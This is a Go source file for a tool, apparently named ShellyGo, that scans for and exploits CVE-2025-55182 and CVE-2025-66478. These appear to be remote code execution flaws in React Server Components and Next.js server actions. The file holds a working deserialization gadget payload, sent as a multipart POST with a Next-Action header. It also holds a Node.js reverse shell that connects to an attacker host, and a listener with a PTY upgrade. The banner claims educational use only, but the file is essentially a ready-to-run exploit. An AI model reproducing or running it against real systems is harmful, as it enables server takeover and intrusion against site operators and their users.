package main

/*
===================
===== Imports =====
===================
*/
import "fmt"
import "net/http"
import "io"
import "strings"
import "flag"
import "bytes"
import "mime/multipart"
import "os"
import "net"
import "time"

/*
==================
===== Colors =====
==================
*/
var (
	orange = "\033[38;5;214m"   // orange (extended color 256)
    goBlue = "\033[38;5;39m"    // Go blue
    green  = "\033[32m"
    red    = "\033[31m"
    yellow = "\033[33m"
    reset  = "\033[0m"
)


/*
==========================
===== Starting point =====
==========================
*/
func main() {
	printBanner()

	// flag definition
	url := flag.String("u", "", "Target URL")
	mode := flag.String("m", "scan", "Mode to use (scan[default]/exploit)")
	lhost := flag.String("l", "", "LHost (only for the exploit mode)")
	lport := flag.String("p", "", "LPort (only for the exploit mode)")
	flag.Parse()

	// check the flag
	if *url == "" {
		fmt.Println(yellow + "[!] " + reset + "Error: URL needed")
		return
	}
	if *mode != "scan" && *mode != "exploit" {
		fmt.Println(yellow + "[!] " + reset + "Error: No mode mentionned")
		return
	}

	// running
	if *mode == "scan" {
		scan(*url)
	} else {
		if *lhost == "" || *lport == "" {
			fmt.Println(yellow + "[!] " + reset + "Error: No lhost or lport specified")
			return
		}
		exploit(*url, *lhost, *lport)
	}
}

/*
=====================
===== Functions =====
=====================
*/

func printBanner() {
	fmt.Println(orange + `   _____ __         ____     ` + reset + goBlue + ` ______` + reset)
	fmt.Println(orange + `  / ___// /_  ___  / / /_  __` + reset + goBlue + `/ ____/___` + reset)
	fmt.Println(orange + `  \__ \/ __ \/ _ \/ / / / / /` + reset + goBlue + ` / __/ __ \` + reset)
	fmt.Println(orange + ` ___/ / / / /  __/ / / /_/ / ` + reset + goBlue + `/_/ / /_/ /` + reset)
	fmt.Println(orange + `/____/_/ /_/\___/_/_/\__, /` + reset + goBlue + `\____/\____/` + reset)
	fmt.Println(orange + "                    /____/\n" + reset)
	fmt.Println(orange + `┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓`)
	fmt.Println(orange + `┃ CVE-2025-55182 & CVE-2025-66478 Scanner/Exploiter ┃` + reset)
	fmt.Println(orange + `┃ Version: 1.0 | by @orty                           ┃` + reset)
	fmt.Println(orange + "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛\n")
	fmt.Println(orange + "Educational purposes only, use on systems you own or have explicit authorization to test\n")
}

func buildPayload(prefix string) (*bytes.Buffer, string) {
	// setup the buffer
	var body bytes.Buffer
	// setup the multipart writer
	writer := multipart.NewWriter(&body)

	// add fields
	writer.WriteField("0", `"$1"`)
	writer.WriteField("1", `{"status":"resolved_model","reason":0,"_response":"$4","value":"{\"then\":\"$3:map\",\"0\":{\"then\":\"$B3\"},\"length\":1}","then":"$2:then"}`)
	writer.WriteField("2", `"$@3"`)
	writer.WriteField("3", "[]")
	writer.WriteField("4", fmt.Sprintf(`{"_prefix":"%s","_formData":{"get":"$3:constructor:constructor"},"_chunks":"$2:_response:_chunks"}`, prefix))
	writer.Close()

	return &body, writer.FormDataContentType()
}

func sendRequest(url string, body *bytes.Buffer, contentType string) (*http.Response, error) {
	// create a request
	req, err := http.NewRequest("POST", url, body)
	if err != nil {
		return nil, err
	}
	// set headers
	req.Header.Set("Content-Type", contentType)
	req.Header.Set("Next-Action", "x")

	// send the request with a client (5s timeout)
	client := &http.Client{Timeout: 5 * time.Second}
	response, err := client.Do(req)
	if err != nil {
		return nil, err
	}

	return response, nil
}

func scan(url string) {
	fmt.Println(yellow + "[*] " + reset + "Scanning " + url + " ...")

	// build the payload with a safe prefix
	body, contentType := buildPayload("console.log(7*7+1)//")

	// send the request
	response, err := sendRequest(url, body, contentType)
	if err != nil {
		// a timeout can indicate the server is busy executing our code
		if strings.Contains(err.Error(), "Timeout") || strings.Contains(err.Error(), "deadline") {
			fmt.Println(green + "[+] " + reset + "The target seems vulnerable (server hung after payload)")
			fmt.Println(yellow + "[*] " + reset + "Check server logs for '50' (7*7+1) to confirm RCE")
		} else {
			fmt.Println(yellow + "[!] " + reset + "Error: ", err)
		}
		return
	}
	defer response.Body.Close()

	// read the response
	respBody, err := io.ReadAll(response.Body)
	if err != nil {
		fmt.Println(yellow + "[!] " + reset + "Error reading response: ", err)
		return
	}

	// check if vulnerable
	if response.StatusCode == 500 && strings.Contains(string(respBody), `E{"digest"`) {
		fmt.Println(green + "[+] " + reset + "The target seems vulnerable")
	} else if response.StatusCode == 500 {
		fmt.Println(green + "[+] " + reset + "The target seems vulnerable (server error after payload)")
	} else {
		fmt.Println(red + "[-] " + reset + "The target seems not vulnerable")
	}
	fmt.Println(string(respBody))
}

func exploit(url string, lhost string, lport string){
	listener, err := net.Listen("tcp", "0.0.0.0:"+ lport)
	if err != nil {
		fmt.Println(yellow + "[!] " + reset + "Error starting listener: ", err)
		return
	}
	fmt.Println(green + "[+] " + reset + "Listener started on 0.0.0.0:" + lport)

	// build reverse shell payload — pure Node.js, no bash needed
	jsShell := fmt.Sprintf(
		"(function(){var n=global.process.mainModule.require('net'),cp=global.process.mainModule.require('child_process'),s=n.connect(%s,'%s',function(){var sh=cp.spawn('/bin/sh',['-i']);s.pipe(sh.stdin);sh.stdout.pipe(s);sh.stderr.pipe(s)})})()//",
		lport, lhost)
	prefix := jsShell

	go func(){
		fmt.Println(yellow + "[*] " + reset + "Sending exploit payload ...")
		body, contentType := buildPayload(prefix)
		response, err := sendRequest(url, body, contentType)
		if err != nil {
			return
		}
		defer response.Body.Close()
	}()

	fmt.Println(yellow + "[*] " + reset + "Waiting for reverse shell ...")
	conn, err := listener.Accept()
	if err != nil {
		fmt.Println(yellow + "[!] " + reset + "Error accepting connection: ", err)
		return
	}
	conn.Write([]byte("export TERM=xterm\n"))
	conn.Write([]byte("python3 -c 'import pty;pty.spawn(\"/bin/bash\")' 2>/dev/null || script -qc /bin/bash /dev/null\n"))
	conn.Write([]byte("clear\n"))
	fmt.Println(green + "[+] " + reset + "Connection received!")

	go io.Copy(os.Stdout, conn)
	io.Copy(conn, os.Stdin)
	conn.Close()
	listener.Close()
}
